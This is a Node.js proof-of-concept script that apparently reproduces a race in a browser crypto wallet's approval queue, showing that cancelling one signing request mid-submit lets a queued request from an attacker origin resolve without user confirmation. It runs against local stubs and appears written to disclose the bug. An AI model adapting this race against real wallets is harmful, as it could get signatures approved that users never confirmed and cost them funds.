const Module = require('module');
const path = require('path');
const MAP = {
  'webextension-polyfill': path.join(__dirname, 'stubs/webextension-polyfill.js'),
  'events': null,
  'uuid': path.join(__dirname, 'stubs/uuid.js'),
  'eth-rpc-errors': path.join(__dirname, 'stubs/eth-rpc-errors.js'),
  'eth-rpc-errors/dist/classes': path.join(__dirname, 'stubs/eth-rpc-errors-classes.js'),
  '@sentry/browser': path.join(__dirname, 'stubs/sentry-browser.js'),
  'background/webapi': path.join(__dirname, 'stubs/webapi.js'),
  'consts': path.join(__dirname, 'stubs/consts.js'),
  './transactionHistory': path.join(__dirname, 'stubs/transactionHistory.js'),
  './preference': path.join(__dirname, 'stubs/preference.js'),
  '@/stats': path.join(__dirname, 'stubs/stats.js'),
  '@/utils/chain': path.join(__dirname, 'stubs/utils-chain.js'),
  '@/utils/env': path.join(__dirname, 'stubs/utils-env.js'),
};
const origResolve = Module._resolveFilename;
Module._resolveFilename = function (request, ...rest) {
  if (Object.prototype.hasOwnProperty.call(MAP, request) && MAP[request]) {
    return origResolve.call(this, MAP[request], ...rest);
  }
  return origResolve.call(this, request, ...rest);
};
require('ts-node').register({
  transpileOnly: true,
  compilerOptions: {
    module: 'commonjs',
    target: 'es2019',
    esModuleInterop: true,
    moduleResolution: 'node',
    ignoreDeprecations: '6.0',
  },
});
const notificationService = require('./stubs/notification.ts').default;

async function main() {
  notificationService.approvals = [];
  notificationService.currentApproval = null;
  notificationService.notifiWindowId = null;

  const pA = notificationService.requestApproval({
    approvalComponent: 'SignTx',
    origin: 'https://legit-dapp.example',
    params: { data: [{}] },
  });
  pA.catch((e) => console.log('DEBUG pA settled (rejected):', e && e.message));
  const approvalA = notificationService.currentApproval;
  console.log('[1] currentApproval after A requested :', approvalA.id, approvalA.data.approvalComponent);

  const pB = notificationService.requestApproval({
    approvalComponent: 'SignText',
    origin: 'https://attacker.example',
    params: { data: ['0xDEADBEEF_TRANSFER_ALL_FUNDS', '0xaccount'] },
  });
  console.log('[2] B queued behind A, currentApproval still A:', notificationService.currentApproval.id === approvalA.id);

  await notificationService.rejectApproval('User rejected the request.');
  console.log('[3] currentApproval after Cancel-during-submit :', notificationService.currentApproval.id,
    notificationService.currentApproval.data.approvalComponent,
    notificationService.currentApproval.data.origin);
  console.log('    (this is B - the queue advanced, exactly as intended by the whitelist feature)');

  let bResult = 'PENDING (user has not clicked anything on B yet)';
  pB.then((v) => { bResult = 'RESOLVED with value: ' + JSON.stringify(v); });

  await notificationService.resolveApproval(undefined, false);
  await new Promise((r) => setTimeout(r, 0));
  console.log('[4] result of dApp B\'s promise (B = attacker origin, never confirmed by user):');
  console.log('   ', bResult);

  if (bResult.startsWith('RESOLVED')) {
    console.log('\n*** CONFIRMED: cancelling A mid-submit + A\'s late resolve silently approved B. ***');
    console.log('*** No window close, no service-worker restart needed - ordinary single-window use. ***');
  } else {
    console.log('\nNot reproduced in this harness.');
  }
}

main().catch((e) => {
  console.error('PoC crashed:', e);
  process.exit(1);
});
